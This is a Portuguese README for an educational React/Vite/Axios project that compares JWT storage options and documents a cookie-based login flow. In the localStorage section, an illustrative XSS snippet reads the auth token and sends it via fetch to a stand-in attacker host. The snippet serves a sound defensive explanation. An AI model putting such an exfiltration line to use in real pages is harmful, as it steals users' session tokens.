# Autenticacao JWT no Client Side — React + Vite + Axios

Projeto de referencia para integracao com API Spring Boot autenticada via JWT,
usando **cookie HttpOnly** como estrategia de armazenamento do token.

---

## Onde Guardar o Token? A Decisao Mais Importante do Client

Quando a API retorna um token JWT apos o login, o frontend precisa guarda-lo em algum lugar
para envia-lo nas proximas requisicoes. Existem tres opcoes principais, com trade-offs bem diferentes.

---

### Opcao 1: `localStorage`

```javascript
localStorage.setItem('authToken', token)
```

**Persistencia:** sobrevive ao fechamento do browser — o dado fica ate ser explicitamente removido.

**Problema critico — XSS (Cross-Site Scripting):**

`localStorage` e acessivel por qualquer JavaScript na pagina:

```javascript
// Script malicioso injetado via XSS lê o token diretamente
const tokenRoubado = localStorage.getItem('authToken')
fetch('https://atacante.com/coletar?token=' + tokenRoubado)
```

XSS e a vulnerabilidade #2 no OWASP Top 10. Qualquer biblioteca de terceiros comprometida,
campo de comentario mal sanitizado ou CDN sequestrada pode executar esse ataque.
`localStorage` nao oferece nenhuma barreira.

**Quando usar:** nunca para tokens de autenticacao.

---

### Opcao 2: `sessionStorage`

```javascript
sessionStorage.setItem('authToken', token)
```

**Persistencia:** limitada a aba/guia atual. Fechar a aba apaga o dado.

**Diferenca do localStorage:** cada aba tem seu proprio `sessionStorage` isolado.
Abrir o site em outra aba exige novo login.

**Problema:** ainda e acessivel via JavaScript — XSS continua sendo uma ameaca.

```javascript
// Funciona igualmente com sessionStorage
const tokenRoubado = sessionStorage.getItem('authToken')
```

**Quando usar:** contextos educacionais e prototipos onde XSS nao e uma preocupacao real.
Melhor que `localStorage` pela persistencia limitada, mas nao resolve o vetor XSS.

---

### Opcao 3: Cookie HttpOnly (esta implementacao)

O servidor define o cookie na resposta de login via header `Set-Cookie`:

```http
Set-Cookie: authToken=eyJ...; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600
```

O browser armazena e reenvia automaticamente. JavaScript **nao consegue le-lo**:

```javascript
document.cookie  // "authToken" NÃO aparece aqui — é HttpOnly
```

**Protecao contra XSS:** mesmo com script malicioso na pagina, o token e inacessivel.

**Protecao contra CSRF:** `SameSite=Strict` impede que o cookie seja enviado
em requisicoes originadas de outros dominios (ex: links de phishing).

**Trade-off — logout real:**
Como o JavaScript nao pode limpar o cookie, o logout precisa chamar o servidor,
que retorna `Set-Cookie: authToken=; maxAge=0` (cookie vazio com expiracao no passado).

---

### Comparativo

| Criterio                  | localStorage        | sessionStorage      | Cookie HttpOnly       |
|---------------------------|---------------------|---------------------|-----------------------|
| Persistencia              | Permanente          | Por aba             | Configuravel (maxAge) |
| Acessivel via JS          | Sim                 | Sim                 | **Nao**               |
| Protecao contra XSS       | Nenhuma             | Nenhuma             | **Alta**              |
| Protecao contra CSRF      | N/A (header manual) | N/A (header manual) | Via SameSite          |
| Compartilhado entre abas  | Sim                 | Nao                 | Sim (mesmo dominio)   |
| Logout via JS             | `removeItem()`      | `removeItem()`      | Requer chamada ao servidor |
| Uso recomendado           | Nunca para tokens   | Prototipos/ensino   | **Producao**          |

---

## Como Esta Implementacao Funciona

### Login

```javascript
// Login.jsx
const response = await api.post('/usuarios/login', { email, senha });

// O token esta no cookie HttpOnly — JS nao precisa tocá-lo.
// Guardamos apenas o nome para exibicao e controle de rota.
sessionStorage.setItem('usuario', response.data.nome);
```

O servidor retorna `Set-Cookie: authToken=eyJ...; HttpOnly; ...`.
O browser armazena e enviara automaticamente o cookie em todas as proximas requisicoes.

### Requisicoes autenticadas

```javascript
// api.js — withCredentials envia o cookie automaticamente
const api = axios.create({
  baseURL: import.meta.env.VITE_ENDERECO_API ?? 'http://localhost:8080',
  withCredentials: true,
});

// Nenhum interceptor de REQUEST necessario — o browser cuida do cookie
```

Sem `withCredentials: true`, o browser bloqueia o envio de cookies em requisicoes cross-origin.
No servidor, isso exige CORS com `allowCredentials(true)` e origens explicitas (nao `*`).

### Logout

```javascript
// WelcomePage.jsx
await api.post('/usuarios/logout');
// Servidor responde com: Set-Cookie: authToken=; maxAge=0
// Browser deleta o cookie.

sessionStorage.removeItem('usuario');
navigate('/');
```

### Tratamento global de 401

```javascript
// api.js — interceptor de RESPONSE
api.interceptors.response.use(
  (response) => response,
  (error) => {
    if (error.response?.status === 401) {
      sessionStorage.removeItem('usuario');
      window.location.href = '/'; // redireciona para login
    }
    return Promise.reject(error);
  }
);
```

Token expirado ou invalido em qualquer requisicao redireciona automaticamente para login,
sem precisar tratar 401 em cada componente individualmente.

### Protecao de rotas (PrivateRoute)

```jsx
// routes.jsx
{
  path: '/welcome',
  element: (
    <PrivateRoute>
      <WelcomePage />
    </PrivateRoute>
  ),
}
```

```jsx
// PrivateRoute.jsx
export function PrivateRoute({ children }) {
  const usuario = sessionStorage.getItem('usuario');
  if (!usuario) return <Navigate to="/" replace />;
  return children;
}
```

**Aviso:** `PrivateRoute` e uma protecao de UX, nao de seguranca.
Um usuario mal-intencionado pode inserir dados no `sessionStorage` e acessar a rota,
mas todas as chamadas de API retornarao 401 sem o cookie valido.
O controle real de acesso e sempre no servidor.

---

## Dicas e Cuidados — Client Side

### Nunca decodifique o token no frontend para tomar decisoes de seguranca

O payload do JWT e so Base64 — facil de decodificar:

```javascript
// Qualquer um pode fazer isso
const payload = JSON.parse(atob(token.split('.')[1]))
// { sub: "john@doe.com", authorities: "ROLE_ADMIN", exp: ... }
```

Usar `payload.authorities` para mostrar/esconder botoes e ok (UX).
Usar isso para liberar acesso a dados sensiveis e errado — o servidor deve validar.

### XSS e a ameaca real, mesmo com HttpOnly

Cookie HttpOnly protege o token — mas nao protege outros dados da pagina.
Script malicioso pode:
- Enviar requisicoes autenticadas em nome do usuario (usando o cookie automaticamente)
- Ler outros itens do `sessionStorage` e `localStorage`
- Capturar keystrokes (senhas digitadas)

Sanitize inputs, use Content Security Policy (CSP) e evite `dangerouslySetInnerHTML`.

### `withCredentials` exige CORS configurado corretamente

Se o CORS do servidor usar `Access-Control-Allow-Origin: *`, o browser bloqueara
as requisicoes com `withCredentials: true`. O servidor precisa especificar a origem:

```
Access-Control-Allow-Origin: http://localhost:5173
Access-Control-Allow-Credentials: true
```

### Tokens em cookies e CSRF

Cookies sao enviados automaticamente pelo browser em qualquer requisicao para o dominio.
Um site malicioso poderia induzir o usuario a fazer uma requisicao nao-intencional.

`SameSite=Strict` (configurado no servidor) resolve isso: o cookie so e enviado
em requisicoes que tem a mesma origem que o documento atual.

### sessionStorage vs. cookie — sincronizacao de estado

Nesta implementacao, o cookie (no servidor) e o `sessionStorage` (no cliente) ficam em sync:
- Login: servidor cria cookie, cliente guarda nome em sessionStorage
- Logout: servidor limpa cookie, cliente limpa sessionStorage
- Expirar: cookie expira, proxima requisicao retorna 401, interceptor limpa sessionStorage

Se o usuario limpar manualmente o sessionStorage mas o cookie ainda for valido,
o PrivateRoute redireciona para login. Ao fazer login novamente, o cookie antigo
e substituido por um novo. Isso nao e um bug — e comportamento esperado.

### Nunca logue tokens

```javascript
// NUNCA faca isso
console.log('Token:', response.data.token)

// Logs ficam em ferramentas de debug, extensoes do browser,
// sistemas de analytics, gravacoes de sessao (Hotjar, etc.)
```

### Cookies e abas

Ao contrario do `sessionStorage`, cookies sao compartilhados entre abas do mesmo dominio.
Isso significa que o usuario logado em uma aba tambem esta logado em outra — comportamento esperado.
O logout em uma aba (que limpa o cookie) afeta todas as abas.

---

## Como Rodar

```bash
# Instalar dependencias
npm install

# Criar .env na raiz (se nao existir)
echo "VITE_ENDERECO_API=http://localhost:8080" > .env

# Iniciar o servidor de desenvolvimento
npm run dev
```

Acesse `http://localhost:5173` — o Vite inicia nessa porta por padrao.

**Usuario de teste:** `john@doe.com` / `123456` (pre-cadastrado na API)

A API Spring Boot deve estar rodando em `http://localhost:8080`.

---

## Estrutura de Arquivos

```
src/
├── components/
│   └── PrivateRoute.jsx       # Protecao de rota no client side
├── pages/
│   ├── login/
│   │   ├── Login.jsx          # Formulario de login + inicia sessao
│   │   └── Login.module.css
│   └── welcome/
│       ├── WelcomePage.jsx    # Pagina protegida + logout
│       └── Welcome.module.css
├── provider/
│   └── api.js                 # Axios com withCredentials + interceptor 401
├── routes.jsx                 # Rotas com PrivateRoute
├── App.jsx
└── main.jsx
```

---

*Projeto educacional — SPTech | React 18 + Vite + Axios + Cookie HttpOnly*
